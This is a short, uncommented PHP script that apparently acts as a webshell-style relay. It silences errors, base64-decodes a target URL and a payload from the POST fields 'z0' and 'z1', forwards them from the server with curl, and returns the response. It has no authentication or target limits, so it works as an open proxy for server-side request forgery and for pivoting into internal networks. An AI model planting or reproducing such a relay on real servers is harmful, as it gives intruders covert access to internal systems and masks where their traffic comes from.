<?php

error_reporting(0);
header('Content-Type: text/plain');

function is_binary($data) {
    if (preg_match('~[^\x20-\x7E\t\r\n]~', $data)) {
        return true;
    }
    return false;
}

function http_post($url, $data, &$http_code)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);

    if (is_binary($data)) {
        $content_type = 'Content-Type: application/octet-stream';
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
    } else {
        $content_type = 'Content-Type: application/x-www-form-urlencoded';
        
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
    }

    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        $content_type,
    ]);

    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $response;
}

$url  = base64_decode($_POST['z0']);
$data = base64_decode($_POST['z1']);

$http_code = 0;
$body = http_post($url, $data, $http_code);

echo($body);

?>